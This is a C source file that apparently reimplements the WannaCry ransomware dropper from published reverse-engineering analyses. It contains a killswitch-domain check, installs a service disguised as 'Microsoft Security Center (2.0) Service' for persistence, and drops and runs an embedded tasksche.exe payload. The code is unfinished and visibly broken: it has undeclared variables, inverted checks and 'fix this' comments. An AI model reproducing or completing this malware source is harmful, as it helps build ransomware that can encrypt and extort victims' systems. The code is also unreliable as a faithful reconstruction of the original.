//https://medium.com/@yogeshojha/reverse-engineering-wannacry-ransomware-using-ghidra-finding-the-killswitch-a212807e9354
//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/

//Video: https://www.youtube.com/watch?v=Sv8yu12y5zM
//Video: https://www.youtube.com/watch?v=Q90uZS3taG0
//Video: https://www.youtube.com/watch?v=ru5VzUigKqw
//Help from:
//https://tech-zealots.com/threat-lab/dissecting-wannacry-ransomware-to-its-core-technical-analysis/
//https://www.youtube.com/watch?v=Sv8yu12y5zM
//https://www.microsoft.com/security/blog/2017/05/12/wannacrypt-ransomware-worm-targets-out-of-date-systems/
//https://blogs.windows.com/russia/2017/05/17/windows-vs-wannacrypt/

#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

int create_service()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    char executable_path[MAX_PATH]; //Get executable path 
    char exec_with_args[260];
    
    sprintf(exec_with_args, "%s -m security", executable_path);
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(hSCManager != NULL)
    {
        //Fix this
        hService = CreateServiceA(hSCManager,"mssecsvc2.0", "Microsoft Security Center (2.0) Service", 0xf01ff, 16, 2, 1, exec_with_args, NULL, NULL, NULL, NULL, NULL );
        if(hService != NULL)
        {
            StartServiceA(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
        return 0;
    }
       return 0;
}

//not finished 
int drop_tasksche()
{
    HANDLE hModule = GetModuleHandleW("kernel32.dll");
    HANDLE hFile;

    //fix these function definitions
    GetProcAddress(hModule, "CreateProcessA");
    GetProcAddress(hModule, "CreateFileA");
    GetProcAddress(hModule, "WriteFile");
    GetProcAddress(hModule, "CloseHandle");
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;

    HRSRC hResInfo = FindResourceA(0, 1831, "UNK");
    HGLOBAL hResData = LoadResource(0, hResInfo);
    PVOID lpBuffer = LockResource(hResData);
    DWORD nNumberOfBytesToWrite = SizeofResource(0, hResInfo);
    char szFileName[] = "tasksche.exe";
    char szPath[MAX_PATH];
    sprintf(szPath, "C:\\%s\\%s", "WINDOWS", szFileName);
    char szNewPath[MAX_PATH];
    sprintf(szPath, "C:\\%s\\qeriuwjhrf", "WINDOWS");
    MoveFileExA(szPath, szNewPath, 1);
    hFile = CreateFileA(szPath, 0x40000000, 0, 0, 2, 4, 0);
    if(hFile != INVALID_HANDLE_VALUE)
    {
        WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &lpBuffer, 0);
        CloseHandle(hFile);
    }
    
    //run tasksche with /i parameters
    if(CreateProcessA(NULL, szPath, 0, 0, 0, 0x8000000, 0, 0, &pi, &si))
    {
        CloseHandle(hFile);
        CloseHandle(hModule);
    }
}

int no_argument_handler()
{
    create_service();
    drop_tasksche();
}

//https://github.com/jnwilson/MalwareExercises/blob/0994222f90bd7de305ff8115dec053065f8d013f/Chapter%207/ex1.c
//https://github.com/StefanoBelli/lol/blob/92fd0e349ac42eb71ae9a1302559567cca64c0a1/Win32/ServiceLauncher.c
//https://github.com/sagishahar/scripts/blob/master/windows_service.c
int RealMain()
{
  SC_HANDLE hSCManager;
  SC_HANDLE SCObject;
  SERVICE_TABLE_ENTRYA Sstack;
  int *argc;
  char szName[] = "MSSecSvc";
  GetModuleFileName(NULL, &executable_path, sizeof(executable_path));
  
  argc = (int*)__argc();
  if(*argc < 2)
  {
     no_argument_handler();
  }
  
  /* https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
  hSCManager = OpenSCManager(0,0,SC_MANAGER_ALL_ACCESS);
  
  if(!hSCManager)
  {
    hSCObject = OpenServiceA(hSCManager, szName, SERVICE_START);
    if(!hSCObject)
    {
      //SomeFunction(hSCObject, 0x3c);
      CloseServiceHandle(hSCObject);
    }
    CloseServicehandle(hSCManager);
  }
  
  Sstack.lpServiceName = "MSSecSvc 2.0";
  Sstack.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

  StartServiceCtrlDispatcher(&Sstack);

  CloseServiceHandle(hSCManager);
  CloseServiceHandle(SCObject);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    char szUrl[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
    HINTERNET hInternet;
    HINTERNET hUrl;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    hUrl = InternetOpenUrl(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
    if (hUrl)
    {
      InternetCloseHandle(hUrl);
      InternetCloseHandle(hInternet);
      return 0;
    }
    else {
      InternetCloseHandle(hUrl);
      InternetCloseHandle(hInternet);
      RealMain();
    }
    return 0;
}
